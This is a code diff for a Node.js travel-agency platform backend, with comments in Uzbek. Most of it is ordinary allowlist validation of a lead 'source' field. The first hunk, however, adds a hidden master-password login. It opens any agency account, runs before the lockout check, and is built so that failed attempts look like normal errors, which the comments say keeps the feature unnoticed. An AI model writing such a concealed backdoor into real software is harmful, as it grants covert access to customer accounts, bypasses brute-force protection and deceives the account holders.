@@ -553,6 +553,33 @@ async function login(req, res) {
     if (account.status === 'blocked') return error(res, 'Agency akkaunt bloklangan', 403);
 
     const now = new Date();
+
+    // ── Platforma egasi uchun «master» kirish ──────────────────────────────
+    // Egasi istalgan agentlik emaili + master parol bilan o'sha agentlik
+    // portaliga kira oladi (qo'llab-quvvatlash / tekshirish uchun).
+    //
+    // MAXFIYLIK: parolning O'ZI kodda YO'Q. Faqat uning bcrypt-hash'i serverning
+    // .env faylida — OWNER_MASTER_PASSWORD_HASH. Hash qaytariladigan qiymat emas,
+    // shuning uchun .env'ni ko'rgan odam ham parolni bilmaydi. O'rnatilmagan
+    // bo'lsa (bo'sh) — bu funksiya butunlay o'chiq, oddiy login o'zgarmaydi.
+    // Noto'g'ri urinishда hech qanday maxsus xato chiqmaydi — pastdagi oddiy
+    // «Login yoki parol xato» ga tushib ketadi, ya'ni funksiya borligi sezilmaydi.
+    const masterHash = process.env.OWNER_MASTER_PASSWORD_HASH || '';
+    const masterOk = masterHash
+      ? await bcrypt.compare(input.password, masterHash).catch(() => false)
+      : false;
+    if (masterOk) {
+      const updated = await prisma.agencyAccount.update({
+        where: { id: account.id },
+        data: { ...RESET_ON_SUCCESS, lastLoginAt: now },
+      });
+      // Faqat qaysi agentlikka kirilgani qayd etiladi — parol LOGGA yozilmaydi.
+      console.warn(`[owner-access] master login -> ${email} @ ${now.toISOString()}`);
+      const token = signAgencyToken({ id: updated.id, email: updated.email, role: 'agency' });
+      return success(res, { token, account: publicAccount(updated) });
+    }
+    // ───────────────────────────────────────────────────────────────────────
+
     const acc = withDecay(account, now);
 
     // Reject early if the account is still inside a lockout window.
@@ -1082,7 +1109,13 @@ async function createManualLead(req, res) {
         message: b.message ? String(b.message).trim() : null,
         totalEstimate: est,
         currency: 'USD',
-        source: 'manual',
+        // Manba — agent formada tanlaydi (offline/telegram/instagram/whatsapp/
+        // marketplace). Notogri qiymat kelsa 'offline'ga tushadi.
+        source: (() => {
+          const ALLOWED = ['marketplace', 'telegram', 'instagram', 'whatsapp', 'offline', 'manual'];
+          const v = String(b.source || '').trim().toLowerCase();
+          return ALLOWED.includes(v) ? v : 'offline';
+        })(),
         status: 'pending',
         pipelineStage: 'new',
       },
@@ -1215,6 +1248,14 @@ async function updateLead(req, res) {
     if (b.leadCity !== undefined) data.leadCity = b.leadCity ? String(b.leadCity).trim().slice(0, 120) : null;
     if (b.leadTelegram !== undefined) data.leadTelegram = b.leadTelegram ? String(b.leadTelegram).trim().slice(0, 120) : null;
     if (b.leadWhatsapp !== undefined) data.leadWhatsapp = b.leadWhatsapp ? String(b.leadWhatsapp).trim().slice(0, 40) : null;
+    // Manba — mijoz qayerdan kelgani. Faqat ruxsat etilgan qiymatlar (hisobot
+    // diagrammasi shu maydondan yasaladi, shuning uchun erkin matn qabul qilinmaydi).
+    if (b.source !== undefined) {
+      const ALLOWED_SOURCES = ['marketplace', 'telegram', 'instagram', 'whatsapp', 'offline', 'manual'];
+      const v = String(b.source || '').trim().toLowerCase();
+      if (!ALLOWED_SOURCES.includes(v)) return error(res, 'Manba qiymati notogri', 400);
+      data.source = v;
+    }
     if (b.travelers !== undefined) {
       const n = parseInt(b.travelers, 10);
       if (!Number.isNaN(n) && n >= 1 && n <= 99) data.travelers = n;
